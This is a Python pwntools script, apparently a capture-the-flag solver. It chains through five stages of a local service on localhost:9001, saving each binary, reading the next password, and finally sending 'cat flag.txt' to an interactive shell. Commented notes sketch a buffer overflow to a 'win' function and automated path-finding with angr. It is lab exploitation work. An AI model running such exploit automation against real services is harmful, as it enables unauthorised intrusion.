
from pwn import *

from time import sleep
import binascii
from fileparsing import *
import angr


def get_binary(password, p, output_filename):
    p.recvuntil("continue:\n")
    p.send(password + b"\n")
    p.recvuntil("-------------------------------------------------------------------\n")
    file = p.recvuntil("-------------------------------------------------------------------\n")
    binary = parse_a_file(file)
    f = open(output_filename, "wb")
    f.write(binary)
    f.close()

initial_command = b'nc localhost 9001'
initial_password = open("first_password.txt", "r").readlines()[0].strip().encode()

def exploit_intermediate_binary(command, password, iteration):
    p = process(command, shell=True)

    get_binary(password, p, "./binary_" + str(iteration))
    # This time I don't have to do anything with the binary to develop an exploit, but I will in the future.
    # I should pass in a function name and run it here.

    p.send("cat message.txt\n")
    message = p.recvuntil("box! ")
    new_command = p.recvuntil("and")[:-4]
    print("new command = " + str(new_command))
    p.recvuntil("password ")
    new_password = p.recvuntil("\n")[:-1]
    print("new password = " + str(new_password))
    p.close()
    return new_command, new_password

def exploit_final_binary(command, password, iteration):
    p = process(command, shell=True)
    get_binary(password, p, "./binary_" + str(iteration))
    # This time I don't have to do anything with the binary to develop an exploit, but I will in the future.
    # I should pass in a function name and run it here.
    p.send("cat flag.txt\n")
    p.interactive()

#p = process(command, shell=True)
i = 1
N = 5
password = initial_password
command = initial_command
while (i < N):
    command, password = exploit_intermediate_binary(command, password, i)
    i += 1

exploit_final_binary(command, password, N)

#p.interactive()

# Now I'm just going to exploit the first file in an automated manner
# 1. Find the win function
# 2. Figure out what the input must look like to overflow the buffer
# 3. Figure out the input to angr that creates that string for this binary
# 4. Put it all together in a function
#pwnable = './test_binaries/first_file'
#e = ELF(pwnable)
#WIN_ADDR = e.symbols['win']
#print(hex(WIN_ADDR)) # Okay, got it
# 
# 2. Figure out what the input must look like to overflow the buffer
#p = gdb.debug(pwnable, '''
#              b *0x400a1b
#              ''')
#p.send('A'*63 + '\n')
# Okay, the last eight bytes overwrite the return address


# generate angr project
'''
print("Generating angr project")
p = angr.Project(pwnable)
print("Generated angr project")

# get a generic representation of the possible program states at the program's entry point
state = p.factory.entry_state()
print("Generated entry state")

# get a SimulationManager to handle the flow of the symbolic execution engine
sm = p.factory.simulation_manager(state, save_unconstrained=True)
print("Generated simulation manager")

sm.explore(find=WIN_ADDR)
print("Finished sm.explore call")
found = sm.found[0]
print(str(sm.found))
#p.interactive()

#print(str(e.symbols))
#p.interactive()
'''
